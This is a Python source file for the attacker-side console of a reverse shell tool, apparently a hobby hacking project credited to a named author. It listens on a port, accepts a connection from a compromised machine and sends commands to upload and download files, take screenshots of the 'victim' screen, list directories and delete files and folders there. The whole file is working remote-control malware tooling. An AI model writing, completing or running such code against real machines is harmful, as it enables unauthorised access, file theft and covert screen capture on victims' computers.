from os import system
from socket import socket
import socket
import datetime
import sys
BGreen='\033[0;92m'
BBlue='\033[1;34m'
BCyan='\033[1;36m' 
BWhite='\033[1;37m' 
Color_Off='\033[0m'
UGreen='\033[4;32m'
Red='\033[0;31m'
def logo():
    logo=f""" ____                                ____  _          _ _ 
|  _ \ _____   _____ _ __ ___  ___  / ___|| |__   ___| | |
| |_) / _ \ \ / / _ \ '__/ __|/ _ \ \___ \| '_ \ / _ \ | |
|  _ <  __/\ V /  __/ |  \__ \  __/  ___) | | | |  __/ | |
|_| \_\___| \_/ \___|_|  |___/\___| |____/|_| |_|\___|_|_|
    
          {BBlue}[ {Red}${BBlue} ] {UGreen}Programmed By Junaid Khan{Color_Off}"""
    print(logo)
    

def help():
    help=f"""
    {BBlue}upload <file>       {Color_Off}upload a file to Victims Computer

    {BBlue}download <file>     {Color_Off}download file from Victims Computer
    
    {BBlue}screenshot          {Color_Off}Take screenshot of victim screen
    
    {BBlue}cd <directory>      {Color_Off}change directory  
    
    {BBlue}exit                {Color_Off}Terminate Reverse Shell 

    {BBlue}os <command>        {Color_Off}Run Own Command

    {BBlue}ls or dir           {Color_Off}list all files and directory of Victims

    {BBlue}delete <file>       {Color_Off}delete file from victim machine

    {BBlue}rmdir <directory>   {Color_Off}delete empty directory from victim machine
    {Color_Off}"""
    print(help)
try:
    logo()
    server=socket.socket()
    ip=socket.gethostbyname(socket.gethostname())
    server.bind((ip,4321))
    print("Listening for the connection ...")
    server.listen()
    connection,address=server.accept()
    system("clear")
    logo()
    print(f"{Red}[{BGreen}*{Red}]{BCyan}Connetion is Established with {Red}[{BWhite}{address[0]}{Red}]")
    while True:
     command=input(f"{BGreen}[ Enter Command ] >{Color_Off} ")
##################################################################################
#                          Show Help
# ###############################################################################     
     if command=='help' or command=='?':
         help()
##################################################################################
#                          exit connection
# ###############################################################################              
     elif command=='exit' or command=='quit':
         sys.exit()
##################################################################################
#                          Code for Uploading file to Victim
# ###############################################################################              
     elif command[:6]=='upload':
         connection.send(command)
         file_name=open(command[7:],'rb')  
         while True:
             file_binaries=file_name.read()
             if file_binaries==b'':
                 break
             else:
                 connection.sendall(file_binaries)
         print(f"{BWhite}{command[7:]} is uploaded")                  
##################################################################################
#                          Code for downloading file
# ###############################################################################           
     elif command[:8]=='download':
         connection.send(command.encode())
         file_name=open(command[9:],'wb')
         while True:
             file_binaries=connection.recv(1024)
             if file_binaries==b'':
                 break
             else:
                 file_name.write(file_binaries)
         print(f"{command[9:]} is Downloaded")
##################################################################################
#                          Code for grabbing Screenshot 
# ###############################################################################              
     elif command=='screenshot':
         connection.send(command.encode())
         name=str(datetime.datetime.now())
         image_name=str(name.replace(':','-').replace('.','-').replace(' ','-'))+'.png'

         file_name=open(image_name,'wb')
         while True:
             file_binaries=connection.recv(1024)
             if file_binaries==b'':
                 break
             else:
                 file_name.write(file_binaries)
         print(f"{BCyan}[{BGreen}*{BCyan}]{Color_Off}Screenshot is Saved as {image_name}")  
##################################################################################
#                         Code for attacker Os related command
# ###############################################################################              
     elif command[:2]=='os':
         if command[3:]=='clear':    
           system(command[3:])
           logo()
         else:
             system(command[3:]) 
     elif command[:2]=='ls':
         connection.send(command.encode())
         ls_result=connection.recv(1024).decode('UTF-8').replace('\\n','\n')
         print(ls_result.replace('\'','').replace(f'{ls_result[0]}',''))    
     elif command[:2]=='cd':
         connection.send(command.encode())
         response=connection.recv(10000).decode()
         print(response)
     elif command[:6]=='delete':
         connection.send(command.encode())
         print(connection.recv(1024).decode())   
     elif command[:5]=='rmdir':
         connection.send(command.encode())   
         print(connection.recv(1024).decode())  
     elif command=='pwd':
         connection.send(command.encode())
         print(connection.recv(1024).decode())    

     else:
         print(f"{Red}[{BGreen}*{Red}]{BBlue}Command Not Found")
except KeyboardInterrupt:
    print("\nInterrupted By You")
    sys.exit()                 
# except OSError:
#     print(f"{BWhite}[{Red}!{BWhite}] {Color_Off}Address is already in Use")    



                        
    

